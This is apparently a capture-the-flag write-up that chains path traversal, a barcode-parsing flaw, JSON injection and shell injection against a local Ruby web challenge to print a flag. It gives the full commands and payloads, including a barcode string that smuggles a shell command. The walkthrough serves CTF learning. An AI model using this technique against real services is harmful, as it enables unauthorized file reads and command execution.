First, browse the application. You should be able to create an error:

```
$ curl 'http://localhost:8080/display?name=test'
Error in script /app/server.rb: No such file or directory @ rb_sysopen - /app/data/test
```

Note that has a `image/jpeg` content-type, so it might confuse the browser.

That issue grants access to two primitives:

a) Read any file via path traversal

b) The full path to the server

For example:

```
$ curl -s 'http://localhost:8080/display?name=../server.rb' | head -n20
require 'json'
require 'sinatra'
require 'pp'
require 'singlogger'
require 'open3'

::SingLogger.set_level_from_string(level: ENV['log_level'] || 'debug')
LOGGER = ::SingLogger.instance()

# Ideally, we set all these in the Dockerfile
set :bind, ENV['HOST'] || '0.0.0.0'
set :port, ENV['PORT'] || '8080'

SAFER_STREETS_PATH = ENV['SAFER_STREETS'] || '/app/safer-streets'

SCRIPT = File.expand_path(__FILE__)

LOGGER.info("Checking for required binaries...")
if File.exist?(SAFER_STREETS_PATH)
  LOGGER.info("* Found `safer-streets` binary: #{ SAFER_STREETS_PATH }")
[...]
```

You can grab the `safer-streets` binary as well:

```
$ curl -s 'http://localhost:8080/display?name=../../../app/safer-streets' | file -
/dev/stdin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fa512a55e0fbc8c4ad80483379826183f29ce161, for GNU/Linux 3.2.0, with debug_info, not stripped
```

Inspecting the Ruby code shows an shell-injection issue if you control the output of `safer-streets`:

```
system("/usr/bin/report-infraction --node='#{result['node']}' --img='#{photo}'")
```

You can reverse or mess with the binary to discover that it's looking for an image file parameter:

```
$ safer-streets upc.png 
{
  "node": "52d11b6dba5e",
  "speed": "-1",
  "plate": "0123456789104"
}
```

But it won't work on non-UPC codes. I generated a barcode using [Code128](https://github.com/fhunleth/code128), then tried to decode it:

```
$ ./code128png exploit.png 'TEST CODE128'

$ file exploit.png 
exploit.png: PNG image data, 176 x 40, 1-bit grayscale, non-interlaced

$ safer-streets ./exploit.png 
{
  "node": "52d11b6dba5e",
  "speed": "-1",
Invalid plate type: CODE-128!
```

But the logic is actually faulty; here's the C code:

```c
    zbar_symbol_type_t typ = zbar_symbol_get_type(sym);

    for (; sym; sym = zbar_symbol_next(sym)) {
      // unsigned len         = zbar_symbol_get_data_length(sym);
      if (typ == ZBAR_PARTIAL)
        continue;

      if(strcmp(zbar_get_symbol_name(typ), "EAN-13")) {
        fprintf(stderr, "Invalid plate type: %s!\n", zbar_get_symbol_name(typ));
        exit(1);
      }

      printf("%s", zbar_symbol_get_data(sym));
    }
```

Note that the `typ` check is outside the loop, which means if you have multiple barcodes they'll get concatenated (I hinted at that in one of the preview images by having two UPC codes) (it also needs to be bigger):

```
$ mogrify -resize '200%x200%' exploit.png && montage -tile 1x2 -geometry +8+8 exploit.png upc.png combined.png

$ ./safer-streets combined.png 
{
  "node": "52d11b6dba5e",
  "speed": "-1",
  "plate": "0123456789104TESTCODE128"
}
```

Using that technique, you can do some JSON injection to add an extra node field:

```
$ ./code128png exploit.png 'test", "node": "hi' && mogrify -resize '200%x200%' exploit.png && montage -tile 1x2 -geometry +8+8 exploit.png upc.png combined.png
```

Which will mess up the parsing:

```
$ ./safer-streets combined.png 
{
  "node": "52d11b6dba5e",
  "speed": "-1",
  "plate": "0123456789104test","node":"hi"
}
```

With `jq`, note that we can control `"hi"`:

```
$ ./safer-streets combined.png  | jq
{
  "node": "hi",
  "speed": "-1",
  "plate": "0123456789104test"
}
```

That, with the shell injection we mentioned above, we can create ourselves a payload:

```
./code128png exploit.png "test\", \"node\": \"hi'; /home/ctf/print-flag > /tmp/flag.txt; #" && mogrify -resize '200%x200%' exploit.png && montage -tile 1x2 -geometry +8+8 exploit.png upc.png combined.png
```

Then submit that and grab the flag:

```
$ curl -F "photo=@./combined.png" http://localhost:8080/upload
$ curl 'http://localhost:8080/display?name=../../../../tmp/flag.txt'
CTF{show-me-your-best-images}
```
